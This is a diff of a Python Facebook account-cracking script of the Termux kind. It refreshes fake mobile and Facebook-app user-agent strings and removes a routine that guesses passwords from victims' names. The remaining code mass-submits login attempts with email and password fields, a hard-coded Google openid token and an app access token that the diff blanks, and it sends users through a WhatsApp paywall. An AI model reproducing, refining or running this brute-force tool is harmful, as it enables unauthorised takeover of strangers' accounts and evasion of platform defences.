@@ -90,7 +90,13 @@ except: pass
 
 for xd in range(5000):
 	
-	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+	aa=["Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/465.0.0.51.69;]",
+
+"Mozilla/5.0 (Linux; Android 14; SM-S711B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/462.0.0.47.76;]",
+
+"Mozilla/5.0 (Linux; Android 14; Xiaomi 23127PN0CG Build/UKQ1.231003.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/464.0.0.49.70;]",
+
+"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6392.72 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/466.0.0.55.68;]"
 	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
 	c=' en-us; GT-','Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -341,7 +347,7 @@ def menu():
        # os.system('xdg-open https://wa.me/+8801310067277')
 #---------------------[ USER - AGENT ] -------------------#
 def uaxxx():
-    ua='[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV/5718626;FBCR/null;FBMF/sony Ericsson Xperia U;FBBD/sony Ericsson Xperia U;FBPN/com.facebook.katana;FBDV/;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    ua='[FBAN/FB4A;FBAV/355.0.0.83.164;FBBV/15972112;FBDM/{density=6.2,width=1286,height=2249};FBLC/en_US;FBRV/60542419;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S757BL;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]
     return ua
 def method_crack():
     global methods
@@ -374,24 +380,7 @@ def method_crack():
       print('\n Select Wrong Option ...')
       time.sleep(2)
       method_crack()
-def auto_passwords(name):
-    try:
-        first = name.split(' ')[0].lower()
-        last = name.split(' ')[1].lower()
-    except:
-        first = name.lower()
-        last = "123"
 
-    pw = []
-    pw.append(first)
-    pw.append(first + "123")
-    pw.append(first + "12345")
-    pw.append(first + last)
-    pw.append(first + last + "123")
-    pw.append(first + "786")
-    pw.append("123456")
-
-    return pw		
 class main_crack():
     def __init__(self):
         self.id=[]
@@ -431,7 +420,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             ######m1#####
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/207.0.0.72.166;FBBV/74287579;FBDM/{density=3.7,width=1019,height=2540};FBLC/en_US;FBRV/93070009;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120FN;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]
             fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
@@ -527,7 +516,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
             #######m3####
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/207.0.0.72.166;FBBV/74287579;FBDM/{density=3.7,width=1019,height=2540};FBLC/en_US;FBRV/93070009;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120FN;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]
             ######
             fs = name.split(' ')[0]
             try:
@@ -622,7 +611,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
             ####m2######
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/355.0.0.83.164;FBBV/15972112;FBDM/{density=6.2,width=1286,height=2249};FBLC/en_US;FBRV/60542419;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S757BL;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]
             fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
@@ -645,7 +634,7 @@ class main_crack():
 'openid_provider': 'google',
 "email": sid,
 "password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"access_token": "",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "V2_UNTAGGED",
 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
@@ -737,7 +726,7 @@ class main_crack():
 'openid_provider': 'google',
 "email": sid,
 "password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"access_token": "",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "V2_UNTAGGED",
 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
@@ -940,6 +929,11 @@ def rcrack(uid,pwx,tl):
 ############            
 
 ##########
+
+
+
+
+   
 def approval():
   clear()
   try:
@@ -962,7 +956,7 @@ def approval():
       print(" \033[1;32m[\033[1;31m–\033[1;32m] Note : \033[1;32mPAY AND TRY")
       print('\033[1;34m─────────────────────────────────────────────')
       input(' \033[1;32m[\033[1;31m–\033[1;32m] Press Enter To Go To WhatsApp')
-      os.system('am start https://wa.me/+213655643510')
+      os.system('am start https://wa.me/+213783848793')
       approval()
     if sec=='Apv':menu()
     else:exit()
@@ -977,9 +971,3 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
-
-
-
-
-
-
